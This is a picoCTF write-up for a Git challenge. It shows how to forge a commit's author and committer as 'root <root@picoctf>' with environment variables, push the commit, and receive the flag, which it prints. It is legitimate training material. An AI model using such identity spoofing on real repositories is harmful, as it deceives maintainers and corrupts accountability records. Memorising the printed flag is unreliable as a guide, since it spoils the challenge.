Author: Darkraicg492

#### Description

I have built my own Git server with my own rules!

Additional details will be available after launching your challenge instance.

Hints:
1. How do you specify your Git username and email?

---
After cloning the git repo we get a `challenge` named directory and in that dir. we have one README.md file 
```README.md
└─$ cat README.md 
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
```

Ok so let's try to push a fake flag here

```bash
# 1. Add the flag.txt file (content doesn't matter)
echo "fake" > flag.txt
git add flag.txt

# 2. Commit with the exact required identity
#    GIT_COMMITTER_* overrides who "actually committed"
#    --author makes it look like root wrote it too (optional but cleaner)
GIT_COMMITTER_NAME=root GIT_COMMITTER_EMAIL=root@picoctf \
git commit -m "add flag" --author="root <root@picoctf>"

# 3. Push to the correct branch (usually 'master' in picoCTF git challenges)
git push origin master
# or simply: git push    (if your current branch is already master)
```

- You needed to `git add flag.txt` first — otherwise nothing is staged.
- The critical part is setting `GIT_COMMITTER_NAME` and `GIT_COMMITTER_EMAIL` → that's what the server checks.
- Branch name was `master` (not `main`), so `git push origin main` failed, but `git push` or `git push origin master` succeeded.
- Once the commit was pushed with the correct committer identity → server accepted it and will give the flag.

```bash
└─$ git commit -m "add flag" --author="root <root@picoctf>"
On branch master
Your branch is up to date with 'origin/master'.

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        flag.txt

nothing added to commit but untracked files present (use "git add" to track)
```

Add the `flag.txt` >
```bash
└─$ git add flag.txt 
```

Commit it >
```bash
└─$ GIT_COMMITTER_NAME=root GIT_COMMITTER_EMAIL=root@picoctf \
git commit -m "add flag" --author="root <root@picoctf>"
[master 3c71f40] add flag
 1 file changed, 1 insertion(+)
 create mode 100644 flag.txt

```

Push it >
```bash
└─$ git push            
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
git@foggy-cliff.picoctf.net's password: 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (4/4), 403 bytes | 403.00 KiB/s, done.
Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_367122f4}
To ssh://foggy-cliff.picoctf.net:59916/git/challenge.git
   088b58f..3c71f40  master -> master
```


And we have our flag 
```shell
picoCTF{1mp3rs0n4t4_g17_345y_367122f4}
```

